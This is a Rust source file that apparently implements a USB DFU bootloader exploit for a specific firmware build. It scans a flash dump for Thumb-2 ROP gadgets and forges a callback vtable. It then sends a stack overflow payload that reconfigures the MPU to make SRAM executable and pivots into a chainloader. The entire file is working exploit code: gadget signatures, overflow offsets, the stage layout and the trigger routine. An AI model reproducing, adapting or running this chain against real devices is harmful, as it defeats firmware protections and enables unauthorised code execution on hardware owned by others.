//! Modern bootloader build (v24_26 / boot_new) architectural implementation:
//! - 0x820 offset for the stock byte setter (MPU_RNR target)
//! - WORD_STORE primitive (`str r0, [r4]; pop {r4, pc}`)
//! - 6-register push and 0x18 SP-decrement stack frames in stock callbacks
//! - Reorganized USB DFU vtable layout dynamically identified:
//!   - Either candidate at +8 (callback: 8, setter: 12, descriptor: 16)
//!   - Or candidate at +12 (callback: 12, setter: 16, descriptor: 20)
//!
//! Gadget addresses and vtable offsets are dynamically identified at runtime
//! using Thumb-2 byte signature scanning against the internal flash dump.

use anyhow::{Context, Result, bail};
use rusb::{DeviceHandle, GlobalContext};

pub use super::base::*;
use crate::bootloader::compute_sha256;
use crate::dfu::read_memory;
use crate::sigscan::{FLASH_BASE, find_signature};

pub const MARKER: u32 = STAGE + 0x1B0;
pub const STOCK_SETTER_OFFSET: u32 = 0x820;
pub const STACK_FRAME_DECREMENT: u32 = 0x18;
pub const OVERFLOW_OFFSET: usize = 0x8F8;
pub const OVERFLOW_PAYLOAD_SIZE: usize = OVERFLOW_OFFSET + 4;
pub const TABLE_OFFSET: usize = 0x700;

pub fn get_overflow_offset(flash_data: &[u8]) -> usize {
    const TARGET_HASH: &str = "136c56ff5dbd6a1174f41a2364e5c4b1aea362befd761f68d68e15996aecbf79";
    let hash = compute_sha256(flash_data);
    if hash == TARGET_HASH {
        return 0x900;
    }
    if flash_data.len() < 0x80000 {
        let mut padded = flash_data.to_vec();
        padded.resize(0x80000, 0xFF);
        if compute_sha256(&padded) == TARGET_HASH {
            return 0x900;
        }
    }
    OVERFLOW_OFFSET
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct NewSymbols {
    pub pop_r3_pc: u32,
    pub pop_r0_r1_r2_r4_r6_r7_pc: u32,
    pub bx_r3: u32,
    pub memmove: u32,
    pub pivot: u32,
    pub nested_pivot: u32,
    pub stock_setter: u32,
    pub word_store: u32,
    pub initial_callback: u32,
    pub stock_callback: u32,
}

impl NewSymbols {
    pub fn for_each<F: FnMut(&str, u32)>(&self, mut f: F) {
        f("POP_R3_PC", self.pop_r3_pc);
        f(
            "POP_R0_R1_R2_R4_R6_R7_PC",
            self.pop_r0_r1_r2_r4_r6_r7_pc,
        );
        f("BX_R3", self.bx_r3);
        f("MEMMOVE", self.memmove);
        f("PIVOT", self.pivot);
        f("NESTED_PIVOT", self.nested_pivot);
        f("STOCK_SETTER", self.stock_setter);
        f("WORD_STORE", self.word_store);
        f("INITIAL_CALLBACK", self.initial_callback);
        f("STOCK_CALLBACK", self.stock_callback);
    }
}

pub fn resolve_symbols(flash_bytes: &[u8], base_address: u32) -> Result<NewSymbols> {
    let pop_r3_pc = find_signature(flash_bytes, "08 BD", true, base_address)?;
    let pop_r0_r1_r2_r4_r6_r7_pc =
        find_signature(flash_bytes, "D7 BD", true, base_address)?;
    let bx_r3 = find_signature(
        flash_bytes,
        "BD E8 70 40 18 47",
        true,
        base_address,
    )?;
    let memmove = find_signature(
        flash_bytes,
        "88 42 10 B5 01 EB 02 04",
        true,
        base_address,
    )?;
    let pivot = find_signature(
        flash_bytes,
        "BF F3 4F 8F BF F3 6F 8F D5 E9 00 32 83 F3 08 88 10 47",
        true,
        base_address,
    )?;
    let nested_pivot = find_signature(
        flash_bytes,
        "D5 E9 02 32 83 F3 08 88 10 47",
        true,
        base_address,
    )?;
    let stock_setter = find_signature(
        flash_bytes,
        "80 F8 20 18 70 47",
        true,
        base_address,
    )?;
    let word_store = find_signature(flash_bytes, "20 60 10 BD", true, base_address)?;
    let initial_callback = find_signature(
        flash_bytes,
        "F8 B5 1C 46 0B 78 15 46 BD F8 18 60 13 F0 60 0F",
        true,
        base_address,
    )?;
    let stock_callback = find_signature(
        flash_bytes,
        "2D E9 F0 41 1D 46 86 B0",
        true,
        base_address,
    )?;

    Ok(NewSymbols {
        pop_r3_pc,
        pop_r0_r1_r2_r4_r6_r7_pc,
        bx_r3,
        memmove,
        pivot,
        nested_pivot,
        stock_setter,
        word_store,
        initial_callback,
        stock_callback,
    })
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct VtableOffsets {
    pub callback: usize,
    pub setter: usize,
    pub descriptor: usize,
}

pub const OFFSETS_PLUS_8: VtableOffsets = VtableOffsets {
    callback: 8,
    setter: 12,
    descriptor: 16,
};

pub const OFFSETS_PLUS_12: VtableOffsets = VtableOffsets {
    callback: 12,
    setter: 16,
    descriptor: 20,
};

fn has_literal_pool_reference(data: &[u8], addr: u32) -> bool {
    let target = addr.to_le_bytes();
    data.windows(4).any(|w| w == target)
}

fn points_to_code(data: &[u8], addr: u32) -> bool {
    (addr & 1 == 1) && addr >= FLASH_BASE && (addr.wrapping_sub(FLASH_BASE) as usize) < data.len()
}

pub fn find_vtable_layout(
    data: &[u8],
    stock_callback: u32,
    stock_setter: u32,
) -> Result<(usize, VtableOffsets)> {
    let mut needle = [0u8; 8];
    needle[0..4].copy_from_slice(&stock_callback.to_le_bytes());
    needle[4..8].copy_from_slice(&stock_setter.to_le_bytes());

    if data.len() < 8 {
        bail!("Could not find stock vtable reference pointers in firmware (data too short)");
    }

    for (pos, window) in data.windows(8).enumerate() {
        if window == needle {
            if pos < 8 {
                bail!("Found vtable pointers at offset {pos}");
            }

            let cand_8_addr = FLASH_BASE
                .checked_add((pos - 8) as u32)
                .context("Candidate vtable +8 address overflow")?;
            let ref_8 = has_literal_pool_reference(data, cand_8_addr);

            let (ref_12, minus_12_points_to_code) = if pos >= 12 {
                let cand_12_addr = FLASH_BASE
                    .checked_add((pos - 12) as u32)
                    .context("Candidate vtable +12 address overflow")?;
                let has_ref = has_literal_pool_reference(data, cand_12_addr);
                let is_code = points_to_code(data, word(data, pos - 12));
                (has_ref, is_code)
            } else {
                (false, false)
            };

            let offsets = if ref_12 && !ref_8 {
                OFFSETS_PLUS_12
            } else if ref_8 && !ref_12 {
                OFFSETS_PLUS_8
            } else if pos >= 12 && minus_12_points_to_code {
                OFFSETS_PLUS_12
            } else {
                OFFSETS_PLUS_8
            };

            let start = pos - offsets.callback;
            return Ok((start, offsets));
        }
    }

    bail!("Could not find stock vtable reference pointers in firmware");
}

pub fn find_vtable_offset(data: &[u8], stock_callback: u32, stock_setter: u32) -> Result<usize> {
    let (start, _) = find_vtable_layout(data, stock_callback, stock_setter)?;
    Ok(start)
}

pub fn find_vtable(
    data: &[u8],
    stock_callback: u32,
    stock_setter: u32,
    vtable_size: usize,
) -> Result<Vec<u8>> {
    let (table, _) = find_vtable_with_layout(data, stock_callback, stock_setter, vtable_size)?;
    Ok(table)
}

pub fn find_vtable_with_layout(
    data: &[u8],
    stock_callback: u32,
    stock_setter: u32,
    vtable_size: usize,
) -> Result<(Vec<u8>, VtableOffsets)> {
    let (start, offsets) = find_vtable_layout(data, stock_callback, stock_setter)?;
    if start + vtable_size > data.len() {
        bail!("vtable exceeds firmware size: start=0x{start:x}, size=0x{vtable_size:x}, data_len=0x{:x}", data.len());
    }
    Ok((data[start..start + vtable_size].to_vec(), offsets))
}

pub fn stock_vtable_with_layout(
    callback: Option<u32>,
    flash_data: &[u8],
    symbols: &NewSymbols,
) -> Result<(Vec<u8>, VtableOffsets)> {
    let cb = callback.unwrap_or(symbols.stock_callback);
    let (mut table, offsets) = find_vtable_with_layout(
        flash_data,
        symbols.stock_callback,
        symbols.stock_setter,
        0x100,
    )?;
    if word(&table, offsets.callback) != symbols.stock_callback {
        bail!("Validation failed: vtable[{}] != stock_callback", offsets.callback);
    }
    if word(&table, offsets.setter) != symbols.stock_setter {
        bail!("Validation failed: vtable[{}] != stock_setter", offsets.setter);
    }
    put(&mut table, offsets.callback, cb);
    Ok((table, offsets))
}

pub fn stock_vtable(
    callback: Option<u32>,
    flash_data: &[u8],
    symbols: &NewSymbols,
) -> Result<Vec<u8>> {
    let (table, _) = stock_vtable_with_layout(callback, flash_data, symbols)?;
    Ok(table)
}

pub fn fake_hits(before: &[u8], after: &[u8]) -> Vec<(u32, u8, u8)> {
    fake_hits_with_offset(before, after, STOCK_SETTER_OFFSET as usize)
}

pub fn build_stage(fake_vtable: u32, symbols: &NewSymbols) -> Vec<u8> {
    build_stage_with_offset(fake_vtable, symbols, 12)
}

pub fn build_stage_with_offset(
    fake_vtable: u32,
    symbols: &NewSymbols,
    callback_offset: usize,
) -> Vec<u8> {
    let mut stage = vec![0u8; 0x200];
    let pivot_table = STAGE + 0x1E0;

    // 1. Write the marker: memmove(MARKER, STAGE + 0x1C0, 4)
    put(&mut stage, 0x00, MARKER);
    put(&mut stage, 0x04, STAGE + 0x1C0);
    put(&mut stage, 0x08, 4);
    put(&mut stage, 0x18, symbols.pop_r3_pc);
    put(&mut stage, 0x1C, symbols.memmove);
    put(&mut stage, 0x20, symbols.bx_r3);
    put(&mut stage, 0x30, symbols.pop_r0_r1_r2_r4_r6_r7_pc);

    // 2. Restore modified callback in fake_vtable: memmove(fake_vtable + callback_offset, STAGE + 0x1C4, 4)
    put(&mut stage, 0x34, fake_vtable + callback_offset as u32);
    put(&mut stage, 0x38, STAGE + 0x1C4);
    put(&mut stage, 0x3C, 4);
    put(&mut stage, 0x4C, symbols.pop_r3_pc);
    put(&mut stage, 0x50, symbols.memmove);
    put(&mut stage, 0x54, symbols.bx_r3);
    put(&mut stage, 0x64, symbols.pop_r0_r1_r2_r4_r6_r7_pc);

    // 3. Make SRAM executable:
    // Select MPU region 2 via stock_setter (r0 = MPU_RNR - 0x820, r1 = 2)
    put(&mut stage, 0x68, MPU_RNR.wrapping_sub(STOCK_SETTER_OFFSET));
    put(&mut stage, 0x6C, 2);
    put(&mut stage, 0x80, symbols.pop_r3_pc);
    put(&mut stage, 0x84, symbols.stock_setter);
    put(&mut stage, 0x88, symbols.bx_r3);
    put(&mut stage, 0x98, symbols.pop_r0_r1_r2_r4_r6_r7_pc);

    // 4. Configure MPU RASR: str r0, [r4] ; pop {r4, pc} (word_store)
    // pop_r0_r1_r2_r4_r6_r7_pc loads r0 = MPU_RASR_VALUE, r4 = MPU_RASR, pc = word_store
    put(&mut stage, 0x9C, MPU_RASR_VALUE);
    put(&mut stage, 0xA8, MPU_RASR);
    put(&mut stage, 0xB4, symbols.word_store);

    // word_store pops r4 (dummy) and pc = pop_r3_pc
    put(&mut stage, 0xBC, symbols.pop_r3_pc);
    // pop_r3_pc loads r3 = symbols.pivot, pc = symbols.bx_r3
    put(&mut stage, 0xC0, symbols.pivot);
    put(&mut stage, 0xC4, symbols.bx_r3);
    // bx_r3 pops {r4, r5, r6, lr}, setting r5 = pivot_table, then branches to r3 (pivot)
    put(&mut stage, 0xCC, pivot_table);

    // Data table entries
    put(&mut stage, 0x1C0, MARKER_VALUE);
    put(&mut stage, 0x1C4, symbols.stock_callback);
    put(&mut stage, 0x1E0, SRAM_STACK);
    put(&mut stage, 0x1E4, SRAM_CODE | 1);
    stage
}

pub fn probe(flash_data: &[u8]) -> Result<NewSymbols> {
    let symbols = resolve_symbols(flash_data, FLASH_BASE)?;
    let (_, offsets) = stock_vtable_with_layout(None, flash_data, &symbols)?;
    let stage = build_stage_with_offset(FAKE_VTABLE, &symbols, offsets.callback);
    if word(&stage, 0x84) != symbols.stock_setter {
        bail!("Stage validation failed at 0x84");
    }
    if word(&stage, 0xB4) != symbols.word_store {
        bail!("Stage validation failed at 0xB4");
    }
    if word(&stage, 0x1E4) != (SRAM_CODE | 1) {
        bail!("Stage validation failed at 0x1E4");
    }
    Ok(symbols)
}

pub fn self_check(flash_data: &[u8]) -> Result<()> {
    let chainloader = get_chainloader();
    validate_chainloader(&chainloader)?;

    println!(
        "Self-check [boot_new codebase]: resolving symbols and validating stage layout..."
    );
    let symbols = probe(flash_data)?;
    symbols.for_each(|name, addr| {
        println!("  {name:25} -> 0x{addr:08x}");
    });

    println!("SELF_CHECK_OK");
    Ok(())
}

pub fn boot(
    handle: &DeviceHandle<GlobalContext>,
    flash_data: &[u8],
    save_dump: bool,
) -> Result<()> {
    let chainloader = get_chainloader();
    validate_chainloader(&chainloader)?;

    println!(
        "Resolving symbols dynamically for boot_new codebase:"
    );
    let symbols = resolve_symbols(flash_data, FLASH_BASE)?;
    symbols.for_each(|name, addr| {
        println!("  {name:25} -> 0x{addr:08x}");
    });

    if save_dump {
        save_flash_dump(flash_data)?;
    }

    reset_and_idle(handle)?;

    let before = read_memory(handle, BASE, RAM_SIZE)?;
    let (probe_table, offsets) = stock_vtable_with_layout(None, flash_data, &symbols)?;
    write_fake_vtable(handle, &probe_table)?;

    let overflow_offset = get_overflow_offset(flash_data);
    let overflow_payload_size = overflow_offset + 4;

    let mut probe = vec![0u8; overflow_payload_size];
    put(&mut probe, overflow_offset, FAKE_VTABLE);
    send_probe(handle, &probe)?;

    let after = read_memory(handle, BASE, RAM_SIZE)?;
    let root = find_fresh_root(&fake_hits(&before, &after))?;
    println!(
        "fresh_root=0x{:08x} callback_sp=0x{:08x}",
        root,
        root.wrapping_sub((overflow_offset + STACK_FRAME_DECREMENT as usize) as u32)
    );

    let dynamic_vtable = root.wrapping_sub((overflow_offset - TABLE_OFFSET) as u32);
    let stage = build_stage_with_offset(dynamic_vtable, &symbols, offsets.callback);
    write_stage_payloads(handle, MARKER, &stage, &chainloader)?;

    let mut payload = vec![0u8; overflow_payload_size];
    put(&mut payload, 8, STAGE);
    put(&mut payload, 12, symbols.pop_r0_r1_r2_r4_r6_r7_pc);
    let mut table = stock_vtable(Some(symbols.initial_callback), flash_data, &symbols)?;
    put(&mut table, offsets.descriptor, symbols.nested_pivot);
    payload[TABLE_OFFSET..TABLE_OFFSET + table.len()].copy_from_slice(&table);
    put(&mut payload, overflow_offset, dynamic_vtable);

    trigger_rop(handle, &payload)?;
    Ok(())
}
